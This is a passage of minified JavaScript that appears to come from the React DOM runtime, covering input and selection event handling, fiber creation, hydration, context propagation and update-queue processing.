      case "compositionend":
        return jr(e);
      case "keypress":
        return e.which !== 32 ? null : (Rr = !0,
          Or);
      case "textInput":
        return t = e.data,
          t === Or && Rr ? null : t;
      default:
        return null
    }
  }
  function ym(t, e) {
    if (La)
      return t === "compositionend" || !ac && kr(t, e) ? (t = Nr(),
        Mi = Iu = Xl = null,
        La = !1,
        t) : null;
    switch (t) {
      case "paste":
        return null;
      case "keypress":
        if (!(e.ctrlKey || e.altKey || e.metaKey) || e.ctrlKey && e.altKey) {
          if (e.char && 1 < e.char.length)
            return e.char;
          if (e.which)
            return String.fromCharCode(e.which)
        }
        return null;
      case "compositionend":
        return Mr && e.locale !== "ko" ? null : e.data;
      default:
        return null
    }
  }
  var xm = {
    color: !0,
    date: !0,
    datetime: !0,
    "datetime-local": !0,
    email: !0,
    month: !0,
    number: !0,
    password: !0,
    range: !0,
    search: !0,
    tel: !0,
    text: !0,
    time: !0,
    url: !0,
    week: !0
  };
  function Dr(t) {
    var e = t && t.nodeName && t.nodeName.toLowerCase();
    return e === "input" ? !!xm[t.type] : e === "textarea"
  }
  function Cr(t, e, l, a) {
    Xa ? Qa ? Qa.push(a) : Qa = [a] : Xa = a,
      e = bu(e, "onChange"),
      0 < e.length && (l = new ki("onChange", "change", null, l, a),
        t.push({
          event: l,
          listeners: e
        }))
  }
  var Rn = null
    , kn = null;
  function Sm(t) {
    gd(t, 0)
  }
  function Di(t) {
    var e = d(t);
    if (hr(e))
      return t
  }
  function Ur(t, e) {
    if (t === "change")
      return e
  }
  var wr = !1;
  if (yl) {
    var nc;
    if (yl) {
      var ic = "oninput" in document;
      if (!ic) {
        var Hr = document.createElement("div");
        Hr.setAttribute("oninput", "return;"),
          ic = typeof Hr.oninput == "function"
      }
      nc = ic
    } else
      nc = !1;
    wr = nc && (!document.documentMode || 9 < document.documentMode)
  }
  function qr() {
    Rn && (Rn.detachEvent("onpropertychange", Br),
      kn = Rn = null)
  }
  function Br(t) {
    if (t.propertyName === "value" && Di(kn)) {
      var e = [];
      Cr(e, kn, t, $u(t)),
        zr(Sm, e)
    }
  }
  function zm(t, e, l) {
    t === "focusin" ? (qr(),
      Rn = e,
      kn = l,
      Rn.attachEvent("onpropertychange", Br)) : t === "focusout" && qr()
  }
  function Nm(t) {
    if (t === "selectionchange" || t === "keyup" || t === "keydown")
      return Di(kn)
  }
  function Tm(t, e) {
    if (t === "click")
      return Di(e)
  }
  function _m(t, e) {
    if (t === "input" || t === "change")
      return Di(e)
  }
  function Em(t, e) {
    return t === e && (t !== 0 || 1 / t === 1 / e) || t !== t && e !== e
  }
  var De = typeof Object.is == "function" ? Object.is : Em;
  function jn(t, e) {
    if (De(t, e))
      return !0;
    if (typeof t != "object" || t === null || typeof e != "object" || e === null)
      return !1;
    var l = Object.keys(t)
      , a = Object.keys(e);
    if (l.length !== a.length)
      return !1;
    for (a = 0; a < l.length; a++) {
      var n = l[a];
      if (!ll.call(e, n) || !De(t[n], e[n]))
        return !1
    }
    return !0
  }
  function Yr(t) {
    for (; t && t.firstChild;)
      t = t.firstChild;
    return t
  }
  function Gr(t, e) {
    var l = Yr(t);
    t = 0;
    for (var a; l;) {
      if (l.nodeType === 3) {
        if (a = t + l.textContent.length,
          t <= e && a >= e)
          return {
            node: l,
            offset: e - t
          };
        t = a
      }
      t: {
        for (; l;) {
          if (l.nextSibling) {
            l = l.nextSibling;
            break t
          }
          l = l.parentNode
        }
        l = void 0
      }
      l = Yr(l)
    }
  }
  function Xr(t, e) {
    return t && e ? t === e ? !0 : t && t.nodeType === 3 ? !1 : e && e.nodeType === 3 ? Xr(t, e.parentNode) : "contains" in t ? t.contains(e) : t.compareDocumentPosition ? !!(t.compareDocumentPosition(e) & 16) : !1 : !1
  }
  function Qr(t) {
    t = t != null && t.ownerDocument != null && t.ownerDocument.defaultView != null ? t.ownerDocument.defaultView : window;
    for (var e = Ei(t.document); e instanceof t.HTMLIFrameElement;) {
      try {
        var l = typeof e.contentWindow.location.href == "string"
      } catch {
        l = !1
      }
      if (l)
        t = e.contentWindow;
      else
        break;
      e = Ei(t.document)
    }
    return e
  }
  function uc(t) {
    var e = t && t.nodeName && t.nodeName.toLowerCase();
    return e && (e === "input" && (t.type === "text" || t.type === "search" || t.type === "tel" || t.type === "url" || t.type === "password") || e === "textarea" || t.contentEditable === "true")
  }
  var Am = yl && "documentMode" in document && 11 >= document.documentMode
    , Za = null
    , cc = null
    , Dn = null
    , sc = !1;
  function Lr(t, e, l) {
    var a = l.window === l ? l.document : l.nodeType === 9 ? l : l.ownerDocument;
    sc || Za == null || Za !== Ei(a) || (a = Za,
      "selectionStart" in a && uc(a) ? a = {
        start: a.selectionStart,
        end: a.selectionEnd
      } : (a = (a.ownerDocument && a.ownerDocument.defaultView || window).getSelection(),
        a = {
          anchorNode: a.anchorNode,
          anchorOffset: a.anchorOffset,
          focusNode: a.focusNode,
          focusOffset: a.focusOffset
        }),
      Dn && jn(Dn, a) || (Dn = a,
        a = bu(cc, "onSelect"),
        0 < a.length && (e = new ki("onSelect", "select", null, e, l),
          t.push({
            event: e,
            listeners: a
          }),
          e.target = Za)))
  }
  function va(t, e) {
    var l = {};
    return l[t.toLowerCase()] = e.toLowerCase(),
      l["Webkit" + t] = "webkit" + e,
      l["Moz" + t] = "moz" + e,
      l
  }
  var Va = {
    animationend: va("Animation", "AnimationEnd"),
    animationiteration: va("Animation", "AnimationIteration"),
    animationstart: va("Animation", "AnimationStart"),
    transitionrun: va("Transition", "TransitionRun"),
    transitionstart: va("Transition", "TransitionStart"),
    transitioncancel: va("Transition", "TransitionCancel"),
    transitionend: va("Transition", "TransitionEnd")
  }
    , rc = {}
    , Zr = {};
  yl && (Zr = document.createElement("div").style,
    "AnimationEvent" in window || (delete Va.animationend.animation,
      delete Va.animationiteration.animation,
      delete Va.animationstart.animation),
    "TransitionEvent" in window || delete Va.transitionend.transition);
  function ba(t) {
    if (rc[t])
      return rc[t];
    if (!Va[t])
      return t;
    var e = Va[t], l;
    for (l in e)
      if (e.hasOwnProperty(l) && l in Zr)
        return rc[t] = e[l];
    return t
  }
  var Vr = ba("animationend")
    , Kr = ba("animationiteration")
    , Jr = ba("animationstart")
    , Mm = ba("transitionrun")
    , Om = ba("transitionstart")
    , Rm = ba("transitioncancel")
    , $r = ba("transitionend")
    , Wr = new Map
    , oc = "abort auxClick beforeToggle cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");
  oc.push("scrollEnd");
  function Pe(t, e) {
    Wr.set(t, e),
      F(e, [t])
  }
  var Fr = new WeakMap;
  function Xe(t, e) {
    if (typeof t == "object" && t !== null) {
      var l = Fr.get(t);
      return l !== void 0 ? l : (e = {
        value: t,
        source: e,
        stack: mr(e)
      },
        Fr.set(t, e),
        e)
    }
    return {
      value: t,
      source: e,
      stack: mr(e)
    }
  }
  var Qe = []
    , Ka = 0
    , fc = 0;
  function Ci() {
    for (var t = Ka, e = fc = Ka = 0; e < t;) {
      var l = Qe[e];
      Qe[e++] = null;
      var a = Qe[e];
      Qe[e++] = null;
      var n = Qe[e];
      Qe[e++] = null;
      var i = Qe[e];
      if (Qe[e++] = null,
        a !== null && n !== null) {
        var u = a.pending;
        u === null ? n.next = n : (n.next = u.next,
          u.next = n),
          a.pending = n
      }
      i !== 0 && Ir(l, n, i)
    }
  }
  function Ui(t, e, l, a) {
    Qe[Ka++] = t,
      Qe[Ka++] = e,
      Qe[Ka++] = l,
      Qe[Ka++] = a,
      fc |= a,
      t.lanes |= a,
      t = t.alternate,
      t !== null && (t.lanes |= a)
  }
  function dc(t, e, l, a) {
    return Ui(t, e, l, a),
      wi(t)
  }
  function Ja(t, e) {
    return Ui(t, null, null, e),
      wi(t)
  }
  function Ir(t, e, l) {
    t.lanes |= l;
    var a = t.alternate;
    a !== null && (a.lanes |= l);
    for (var n = !1, i = t.return; i !== null;)
      i.childLanes |= l,
        a = i.alternate,
        a !== null && (a.childLanes |= l),
        i.tag === 22 && (t = i.stateNode,
          t === null || t._visibility & 1 || (n = !0)),
        t = i,
        i = i.return;
    return t.tag === 3 ? (i = t.stateNode,
      n && e !== null && (n = 31 - fe(l),
        t = i.hiddenUpdates,
        a = t[n],
        a === null ? t[n] = [e] : a.push(e),
        e.lane = l | 536870912),
      i) : null
  }
  function wi(t) {
    if (50 < ni)
      throw ni = 0,
      bs = null,
      Error(r(185));
    for (var e = t.return; e !== null;)
      t = e,
        e = t.return;
    return t.tag === 3 ? t.stateNode : null
  }
  var $a = {};
  function km(t, e, l, a) {
    this.tag = t,
      this.key = l,
      this.sibling = this.child = this.return = this.stateNode = this.type = this.elementType = null,
      this.index = 0,
      this.refCleanup = this.ref = null,
      this.pendingProps = e,
      this.dependencies = this.memoizedState = this.updateQueue = this.memoizedProps = null,
      this.mode = a,
      this.subtreeFlags = this.flags = 0,
      this.deletions = null,
      this.childLanes = this.lanes = 0,
      this.alternate = null
  }
  function Ce(t, e, l, a) {
    return new km(t, e, l, a)
  }
  function mc(t) {
    return t = t.prototype,
      !(!t || !t.isReactComponent)
  }
  function xl(t, e) {
    var l = t.alternate;
    return l === null ? (l = Ce(t.tag, e, t.key, t.mode),
      l.elementType = t.elementType,
      l.type = t.type,
      l.stateNode = t.stateNode,
      l.alternate = t,
      t.alternate = l) : (l.pendingProps = e,
        l.type = t.type,
        l.flags = 0,
        l.subtreeFlags = 0,
        l.deletions = null),
      l.flags = t.flags & 65011712,
      l.childLanes = t.childLanes,
      l.lanes = t.lanes,
      l.child = t.child,
      l.memoizedProps = t.memoizedProps,
      l.memoizedState = t.memoizedState,
      l.updateQueue = t.updateQueue,
      e = t.dependencies,
      l.dependencies = e === null ? null : {
        lanes: e.lanes,
        firstContext: e.firstContext
      },
      l.sibling = t.sibling,
      l.index = t.index,
      l.ref = t.ref,
      l.refCleanup = t.refCleanup,
      l
  }
  function Pr(t, e) {
    t.flags &= 65011714;
    var l = t.alternate;
    return l === null ? (t.childLanes = 0,
      t.lanes = e,
      t.child = null,
      t.subtreeFlags = 0,
      t.memoizedProps = null,
      t.memoizedState = null,
      t.updateQueue = null,
      t.dependencies = null,
      t.stateNode = null) : (t.childLanes = l.childLanes,
        t.lanes = l.lanes,
        t.child = l.child,
        t.subtreeFlags = 0,
        t.deletions = null,
        t.memoizedProps = l.memoizedProps,
        t.memoizedState = l.memoizedState,
        t.updateQueue = l.updateQueue,
        t.type = l.type,
        e = l.dependencies,
        t.dependencies = e === null ? null : {
          lanes: e.lanes,
          firstContext: e.firstContext
        }),
      t
  }
  function Hi(t, e, l, a, n, i) {
    var u = 0;
    if (a = t,
      typeof t == "function")
      mc(t) && (u = 1);
    else if (typeof t == "string")
      u = Dp(t, l, J.current) ? 26 : t === "html" || t === "head" || t === "body" ? 27 : 5;
    else
      t: switch (t) {
        case st:
          return t = Ce(31, l, e, n),
            t.elementType = st,
            t.lanes = i,
            t;
        case Yt:
          return ya(l.children, n, i, e);
        case zt:
          u = 8,
            n |= 24;
          break;
        case Rt:
          return t = Ce(12, l, e, n | 2),
            t.elementType = Rt,
            t.lanes = i,
            t;
        case ot:
          return t = Ce(13, l, e, n),
            t.elementType = ot,
            t.lanes = i,
            t;
        case Dt:
          return t = Ce(19, l, e, n),
            t.elementType = Dt,
            t.lanes = i,
            t;
        default:
          if (typeof t == "object" && t !== null)
            switch (t.$$typeof) {
              case re:
              case Gt:
                u = 10;
                break t;
              case Tt:
                u = 9;
                break t;
              case Zt:
                u = 11;
                break t;
              case Mt:
                u = 14;
                break t;
              case D:
                u = 16,
                  a = null;
                break t
            }
          u = 29,
            l = Error(r(130, t === null ? "null" : typeof t, "")),
            a = null
      }
    return e = Ce(u, l, e, n),
      e.elementType = t,
      e.type = a,
      e.lanes = i,
      e
  }
  function ya(t, e, l, a) {
    return t = Ce(7, t, a, e),
      t.lanes = l,
      t
  }
  function pc(t, e, l) {
    return t = Ce(6, t, null, e),
      t.lanes = l,
      t
  }
  function hc(t, e, l) {
    return e = Ce(4, t.children !== null ? t.children : [], t.key, e),
      e.lanes = l,
      e.stateNode = {
        containerInfo: t.containerInfo,
        pendingChildren: null,
        implementation: t.implementation
      },
      e
  }
  var Wa = []
    , Fa = 0
    , qi = null
    , Bi = 0
    , Le = []
    , Ze = 0
    , xa = null
    , Sl = 1
    , zl = "";
  function Sa(t, e) {
    Wa[Fa++] = Bi,
      Wa[Fa++] = qi,
      qi = t,
      Bi = e
  }
  function to(t, e, l) {
    Le[Ze++] = Sl,
      Le[Ze++] = zl,
      Le[Ze++] = xa,
      xa = t;
    var a = Sl;
    t = zl;
    var n = 32 - fe(a) - 1;
    a &= ~(1 << n),
      l += 1;
    var i = 32 - fe(e) + n;
    if (30 < i) {
      var u = n - n % 5;
      i = (a & (1 << u) - 1).toString(32),
        a >>= u,
        n -= u,
        Sl = 1 << 32 - fe(e) + n | l << n | a,
        zl = i + t
    } else
      Sl = 1 << i | l << n | a,
        zl = t
  }
  function gc(t) {
    t.return !== null && (Sa(t, 1),
      to(t, 1, 0))
  }
  function vc(t) {
    for (; t === qi;)
      qi = Wa[--Fa],
        Wa[Fa] = null,
        Bi = Wa[--Fa],
        Wa[Fa] = null;
    for (; t === xa;)
      xa = Le[--Ze],
        Le[Ze] = null,
        zl = Le[--Ze],
        Le[Ze] = null,
        Sl = Le[--Ze],
        Le[Ze] = null
  }
  var Ne = null
    , Vt = null
    , At = !1
    , za = null
    , rl = !1
    , bc = Error(r(519));
  function Na(t) {
    var e = Error(r(418, ""));
    throw wn(Xe(e, t)),
    bc
  }
  function eo(t) {
    var e = t.stateNode
      , l = t.type
      , a = t.memoizedProps;
    switch (e[ie] = t,
    e[ge] = a,
    l) {
      case "dialog":
        vt("cancel", e),
          vt("close", e);
        break;
      case "iframe":
      case "object":
      case "embed":
        vt("load", e);
        break;
      case "video":
      case "audio":
        for (l = 0; l < ui.length; l++)
          vt(ui[l], e);
        break;
      case "source":
        vt("error", e);
        break;
      case "img":
      case "image":
      case "link":
        vt("error", e),
          vt("load", e);
        break;
      case "details":
        vt("toggle", e);
        break;
      case "input":
        vt("invalid", e),
          gr(e, a.value, a.defaultValue, a.checked, a.defaultChecked, a.type, a.name, !0),
          _i(e);
        break;
      case "select":
        vt("invalid", e);
        break;
      case "textarea":
        vt("invalid", e),
          br(e, a.value, a.defaultValue, a.children),
          _i(e)
    }
    l = a.children,
      typeof l != "string" && typeof l != "number" && typeof l != "bigint" || e.textContent === "" + l || a.suppressHydrationWarning === !0 || xd(e.textContent, l) ? (a.popover != null && (vt("beforetoggle", e),
        vt("toggle", e)),
        a.onScroll != null && vt("scroll", e),
        a.onScrollEnd != null && vt("scrollend", e),
        a.onClick != null && (e.onclick = yu),
        e = !0) : e = !1,
      e || Na(t)
  }
  function lo(t) {
    for (Ne = t.return; Ne;)
      switch (Ne.tag) {
        case 5:
        case 13:
          rl = !1;
          return;
        case 27:
        case 3:
          rl = !0;
          return;
        default:
          Ne = Ne.return
      }
  }
  function Cn(t) {
    if (t !== Ne)
      return !1;
    if (!At)
      return lo(t),
        At = !0,
        !1;
    var e = t.tag, l;
    if ((l = e !== 3 && e !== 27) && ((l = e === 5) && (l = t.type,
      l = !(l !== "form" && l !== "button") || Cs(t.type, t.memoizedProps)),
      l = !l),
      l && Vt && Na(t),
      lo(t),
      e === 13) {
      if (t = t.memoizedState,
        t = t !== null ? t.dehydrated : null,
        !t)
        throw Error(r(317));
      t: {
        for (t = t.nextSibling,
          e = 0; t;) {
          if (t.nodeType === 8)
            if (l = t.data,
              l === "/$") {
              if (e === 0) {
                Vt = el(t.nextSibling);
                break t
              }
              e--
            } else
              l !== "$" && l !== "$!" && l !== "$?" || e++;
          t = t.nextSibling
        }
        Vt = null
      }
    } else
      e === 27 ? (e = Vt,
        na(t.type) ? (t = qs,
          qs = null,
          Vt = t) : Vt = e) : Vt = Ne ? el(t.stateNode.nextSibling) : null;
    return !0
  }
  function Un() {
    Vt = Ne = null,
      At = !1
  }
  function ao() {
    var t = za;
    return t !== null && (ke === null ? ke = t : ke.push.apply(ke, t),
      za = null),
      t
  }
  function wn(t) {
    za === null ? za = [t] : za.push(t)
  }
  var yc = O(null)
    , Ta = null
    , Nl = null;
  function Ql(t, e, l) {
    B(yc, e._currentValue),
      e._currentValue = l
  }
  function Tl(t) {
    t._currentValue = yc.current,
      X(yc)
  }
  function xc(t, e, l) {
    for (; t !== null;) {
      var a = t.alternate;
      if ((t.childLanes & e) !== e ? (t.childLanes |= e,
        a !== null && (a.childLanes |= e)) : a !== null && (a.childLanes & e) !== e && (a.childLanes |= e),
        t === l)
        break;
      t = t.return
    }
  }
  function Sc(t, e, l, a) {
    var n = t.child;
    for (n !== null && (n.return = t); n !== null;) {
      var i = n.dependencies;
      if (i !== null) {
        var u = n.child;
        i = i.firstContext;
        t: for (; i !== null;) {
          var s = i;
          i = n;
          for (var f = 0; f < e.length; f++)
            if (s.context === e[f]) {
              i.lanes |= l,
                s = i.alternate,
                s !== null && (s.lanes |= l),
                xc(i.return, l, t),
                a || (u = null);
              break t
            }
          i = s.next
        }
      } else if (n.tag === 18) {
        if (u = n.return,
          u === null)
          throw Error(r(341));
        u.lanes |= l,
          i = u.alternate,
          i !== null && (i.lanes |= l),
          xc(u, l, t),
          u = null
      } else
        u = n.child;
      if (u !== null)
        u.return = n;
      else
        for (u = n; u !== null;) {
          if (u === t) {
            u = null;
            break
          }
          if (n = u.sibling,
            n !== null) {
            n.return = u.return,
              u = n;
            break
          }
          u = u.return
        }
      n = u
    }
  }
  function Hn(t, e, l, a) {
    t = null;
    for (var n = e, i = !1; n !== null;) {
      if (!i) {
        if ((n.flags & 524288) !== 0)
          i = !0;
        else if ((n.flags & 262144) !== 0)
          break
      }
      if (n.tag === 10) {
        var u = n.alternate;
        if (u === null)
          throw Error(r(387));
        if (u = u.memoizedProps,
          u !== null) {
          var s = n.type;
          De(n.pendingProps.value, u.value) || (t !== null ? t.push(s) : t = [s])
        }
      } else if (n === Jt.current) {
        if (u = n.alternate,
          u === null)
          throw Error(r(387));
        u.memoizedState.memoizedState !== n.memoizedState.memoizedState && (t !== null ? t.push(di) : t = [di])
      }
      n = n.return
    }
    t !== null && Sc(e, t, l, a),
      e.flags |= 262144
  }
  function Yi(t) {
    for (t = t.firstContext; t !== null;) {
      if (!De(t.context._currentValue, t.memoizedValue))
        return !0;
      t = t.next
    }
    return !1
  }
  function _a(t) {
    Ta = t,
      Nl = null,
      t = t.dependencies,
      t !== null && (t.firstContext = null)
  }
  function ve(t) {
    return no(Ta, t)
  }
  function Gi(t, e) {
    return Ta === null && _a(t),
      no(t, e)
  }
  function no(t, e) {
    var l = e._currentValue;
    if (e = {
      context: e,
      memoizedValue: l,
      next: null
    },
      Nl === null) {
      if (t === null)
        throw Error(r(308));
      Nl = e,
        t.dependencies = {
          lanes: 0,
          firstContext: e
        },
        t.flags |= 524288
    } else
      Nl = Nl.next = e;
    return l
  }
  var jm = typeof AbortController < "u" ? AbortController : function () {
    var t = []
      , e = this.signal = {
        aborted: !1,
        addEventListener: function (l, a) {
          t.push(a)
        }
      };
    this.abort = function () {
      e.aborted = !0,
        t.forEach(function (l) {
          return l()
        })
    }
  }
    , Dm = c.unstable_scheduleCallback
    , Cm = c.unstable_NormalPriority
    , le = {
      $$typeof: Gt,
      Consumer: null,
      Provider: null,
      _currentValue: null,
      _currentValue2: null,
      _threadCount: 0
    };
  function zc() {
    return {
      controller: new jm,
      data: new Map,
      refCount: 0
    }
  }
  function qn(t) {
    t.refCount--,
      t.refCount === 0 && Dm(Cm, function () {
        t.controller.abort()
      })
  }
  var Bn = null
    , Nc = 0
    , Ia = 0
    , Pa = null;
  function Um(t, e) {
    if (Bn === null) {
      var l = Bn = [];
      Nc = 0,
        Ia = _s(),
        Pa = {
          status: "pending",
          value: void 0,
          then: function (a) {
            l.push(a)
          }
        }
    }
    return Nc++,
      e.then(io, io),
      e
  }
  function io() {
    if (--Nc === 0 && Bn !== null) {
      Pa !== null && (Pa.status = "fulfilled");
      var t = Bn;
      Bn = null,
        Ia = 0,
        Pa = null;
      for (var e = 0; e < t.length; e++)
        (0,
          t[e])()
    }
  }
  function wm(t, e) {
    var l = []
      , a = {
        status: "pending",
        value: null,
        reason: null,
        then: function (n) {
          l.push(n)
        }
      };
    return t.then(function () {
      a.status = "fulfilled",
        a.value = e;
      for (var n = 0; n < l.length; n++)
        (0,
          l[n])(e)
    }, function (n) {
      for (a.status = "rejected",
        a.reason = n,
        n = 0; n < l.length; n++)
        (0,
          l[n])(void 0)
    }),
      a
  }
  var uo = T.S;
  T.S = function (t, e) {
    typeof e == "object" && e !== null && typeof e.then == "function" && Um(t, e),
      uo !== null && uo(t, e)
  }
    ;
  var Ea = O(null);
  function Tc() {
    var t = Ea.current;
    return t !== null ? t : Bt.pooledCache
  }
  function Xi(t, e) {
    e === null ? B(Ea, Ea.current) : B(Ea, e.pool)
  }
  function co() {
    var t = Tc();
    return t === null ? null : {
      parent: le._currentValue,
      pool: t
    }
  }
  var Yn = Error(r(460))
    , so = Error(r(474))
    , Qi = Error(r(542))
    , _c = {
      then: function () { }
    };
  function ro(t) {
    return t = t.status,
      t === "fulfilled" || t === "rejected"
  }
  function Li() { }
  function oo(t, e, l) {
    switch (l = t[l],
    l === void 0 ? t.push(e) : l !== e && (e.then(Li, Li),
      e = l),
    e.status) {
      case "fulfilled":
        return e.value;
      case "rejected":
        throw t = e.reason,
        mo(t),
        t;
      default:
        if (typeof e.status == "string")
          e.then(Li, Li);
        else {
          if (t = Bt,
            t !== null && 100 < t.shellSuspendCounter)
            throw Error(r(482));
          t = e,
            t.status = "pending",
            t.then(function (a) {
              if (e.status === "pending") {
                var n = e;
                n.status = "fulfilled",
                  n.value = a
              }
            }, function (a) {
              if (e.status === "pending") {
                var n = e;
                n.status = "rejected",
                  n.reason = a
              }
            })
        }
        switch (e.status) {
          case "fulfilled":
            return e.value;
          case "rejected":
            throw t = e.reason,
            mo(t),
            t
        }
        throw Gn = e,
        Yn
    }
  }
  var Gn = null;
  function fo() {
    if (Gn === null)
      throw Error(r(459));
    var t = Gn;
    return Gn = null,
      t
  }
  function mo(t) {
    if (t === Yn || t === Qi)
      throw Error(r(483))
  }
  var Ll = !1;
  function Ec(t) {
    t.updateQueue = {
      baseState: t.memoizedState,
      firstBaseUpdate: null,
      lastBaseUpdate: null,
      shared: {
        pending: null,
        lanes: 0,
        hiddenCallbacks: null
      },
      callbacks: null
    }
  }
  function Ac(t, e) {
    t = t.updateQueue,
      e.updateQueue === t && (e.updateQueue = {
        baseState: t.baseState,
        firstBaseUpdate: t.firstBaseUpdate,
        lastBaseUpdate: t.lastBaseUpdate,
        shared: t.shared,
        callbacks: null
      })
  }
  function Zl(t) {
    return {
      lane: t,
      tag: 0,
      payload: null,
      callback: null,
      next: null
    }
  }
  function Vl(t, e, l) {
    var a = t.updateQueue;
    if (a === null)
      return null;
    if (a = a.shared,
      (kt & 2) !== 0) {
      var n = a.pending;
      return n === null ? e.next = e : (e.next = n.next,
        n.next = e),
        a.pending = e,
        e = wi(t),
        Ir(t, null, l),
        e
    }
    return Ui(t, a, e, l),
      wi(t)
  }
  function Xn(t, e, l) {
    if (e = e.updateQueue,
      e !== null && (e = e.shared,
        (l & 4194048) !== 0)) {
      var a = e.lanes;
      a &= t.pendingLanes,
        l |= a,
        e.lanes = l,
        wl(t, l)
    }
  }
  function Mc(t, e) {
    var l = t.updateQueue
      , a = t.alternate;
    if (a !== null && (a = a.updateQueue,
      l === a)) {
      var n = null
        , i = null;
      if (l = l.firstBaseUpdate,
        l !== null) {
        do {
          var u = {
            lane: l.lane,
            tag: l.tag,
            payload: l.payload,
            callback: null,
            next: null
          };
          i === null ? n = i = u : i = i.next = u,
            l = l.next
        } while (l !== null);
        i === null ? n = i = e : i = i.next = e
      } else
        n = i = e;
      l = {
        baseState: a.baseState,
        firstBaseUpdate: n,
        lastBaseUpdate: i,
        shared: a.shared,
        callbacks: a.callbacks
      },
        t.updateQueue = l;
      return
    }
    t = l.lastBaseUpdate,
      t === null ? l.firstBaseUpdate = e : t.next = e,
      l.lastBaseUpdate = e
  }
  var Oc = !1;
  function Qn() {
    if (Oc) {
      var t = Pa;
      if (t !== null)
        throw t
    }
  }
  function Ln(t, e, l, a) {
    Oc = !1;
    var n = t.updateQueue;
    Ll = !1;
    var i = n.firstBaseUpdate
      , u = n.lastBaseUpdate
      , s = n.shared.pending;
    if (s !== null) {
      n.shared.pending = null;
      var f = s
        , x = f.next;
      f.next = null,
        u === null ? i = x : u.next = x,
        u = f;
      var _ = t.alternate;
      _ !== null && (_ = _.updateQueue,
        s = _.lastBaseUpdate,
        s !== u && (s === null ? _.firstBaseUpdate = x : s.next = x,
          _.lastBaseUpdate = f))
    }
    if (i !== null) {
      var M = n.baseState;
      u = 0,
        _ = x = f = null,
        s = i;
      do {
        var z = s.lane & -536870913
          , N = z !== s.lane;
        if (N ? (xt & z) === z : (a & z) === z) {
          z !== 0 && z === Ia && (Oc = !0),
            _ !== null && (_ = _.next = {
              lane: 0,
              tag: s.tag,
              payload: s.payload,
              callback: null,
              next: null
            });
          t: {
            var ct = t
              , nt = s;
            z = e;
            var wt = l;
            switch (nt.tag) {
              case 1:
                if (ct = nt.payload,
                  typeof ct == "function") {
                  M = ct.call(wt, M, z);
                  break t
                }
                M = ct;
                break t;
              case 3:
                ct.flags = ct.flags & -65537 | 128;
              case 0:
                if (ct = nt.payload,
                  z = typeof ct == "function" ? ct.call(wt, M, z) : ct,
                  z == null)
                  break t;
                M = C({}, M, z);
                break t;
              case 2:
                Ll = !0
            }
          }
          z = s.callback,
            z !== null && (t.flags |= 64,
              N && (t.flags |= 8192),
              N = n.callbacks,
              N === null ? n.callbacks = [z] : N.push(z))
        } else
          N = {
            lane: z,
            tag: s.tag,
            payload: s.payload,
            callback: s.callback,
            next: null
          },
            _ === null ? (x = _ = N,
              f = M) : _ = _.next = N,
            u |= z;
        if (s = s.next,
          s === null) {
          if (s = n.shared.pending,
            s === null)
            break;
          N = s,
            s = N.next,
            N.next = null,
            n.lastBaseUpdate = N,
            n.shared.pending = null
        }
      } while (!0);
      _ === null && (f = M),
        n.baseState = f,
        n.firstBaseUpdate = x,
        n.lastBaseUpdate = _,
        i === null && (n.shared.lanes = 0),
        ta |= u,
        t.lanes = u,
        t.memoizedState = M
    }
  }
  function po(t, e) {
    if (typeof t != "function")
      throw Error(r(191, t));
    t.call(e)
  }
  function ho(t, e) {
    var l = t.callbacks;
    if (l !== null)
      for (t.callbacks = null,
        t = 0; t < l.length; t++)
        po(l[t], e)
  }
  var tn = O(null)
    , Zi = O(0);
  function go(t, e) {
    t = kl,
      B(Zi, t),
      B(tn, e),
      kl = t | e.baseLanes
  }
  function Rc() {
    B(Zi, kl),
      B(tn, tn.current)
  }
  function kc() {
    kl = Zi.current,
      X(tn),
      X(Zi)
  }
  var Kl = 0
    , mt = null
    , Ct = null
    , It = null
    , Vi = !1
    , en = !1
    , Aa = !1
    , Ki = 0
    , Zn = 0
    , ln = null
    , Hm = 0;
  function Wt() {
    throw Error(r(321))
  }
  function jc(t, e) {
    if (e === null)
      return !1;
    for (var l = 0; l < e.length && l < t.length; l++)
      if (!De(t[l], e[l]))
        return !1;
    return !0
  }
  function Dc(t, e, l, a, n, i) {
    return Kl = i,
      mt = e,
      e.memoizedState = null,
      e.updateQueue = null,
      e.lanes = 0,
      T.H = t === null || t.memoizedState === null ? Po : tf,
      Aa = !1,
      i = l(a, n),
      Aa = !1,
      en && (i = bo(e, l, a, n)),
      vo(t),
      i
  }
  function vo(t) {
    T.H = Pi;
    var e = Ct !== null && Ct.next !== null;
    if (Kl = 0,
      It = Ct = mt = null,
      Vi = !1,
      Zn = 0,
      ln = null,
      e)
      throw Error(r(300));
    t === null || ue || (t = t.dependencies,
      t !== null && Yi(t) && (ue = !0))
  }
  function bo(t, e, l, a) {
    mt = t;
    var n = 0;
    do {
      if (en && (ln = null),
        Zn = 0,
        en = !1,
        25 <= n)
        throw Error(r(301));
      if (n += 1,
        It = Ct = null,
        t.updateQueue != null) {
        var i = t.updateQueue;
        i.lastEffect = null,
          i.events = null,
          i.stores = null,
          i.memoCache != null && (i.memoCache.index = 0)
      }
      T.H = Lm,
        i = e(l, a)
    } while (en);
    return i
  }
  function qm() {
    var t = T.H
      , e = t.useState()[0];
    return e = typeof e.then == "function" ? Vn(e) : e,
      t = t.useState()[0],
      (Ct !== null ? Ct.memoizedState : null) !== t && (mt.flags |= 1024),
      e
  }
  function Cc() {
    var t = Ki !== 0;
    return Ki = 0,
      t
  }
  function Uc(t, e, l) {
    e.updateQueue = t.updateQueue,
      e.flags &= -2053,
      t.lanes &= ~l
  }
  function wc(t) {
    if (Vi) {
      for (t = t.memoizedState; t !== null;) {
        var e = t.queue;
        e !== null && (e.pending = null),
          t = t.next
      }
      Vi = !1
    }
    Kl = 0,
      It = Ct = mt = null,
      en = !1,
      Zn = Ki = 0,
      ln = null
  }
  function Oe() {
    var t = {
      memoizedState: null,
      baseState: null,
      baseQueue: null,
      queue: null,
      next: null
    };
    return It === null ? mt.memoizedState = It = t : It = It.next = t,
      It
  }
  function Pt() {
    if (Ct === null) {
      var t = mt.alternate;
      t = t !== null ? t.memoizedState : null
    } else
      t = Ct.next;
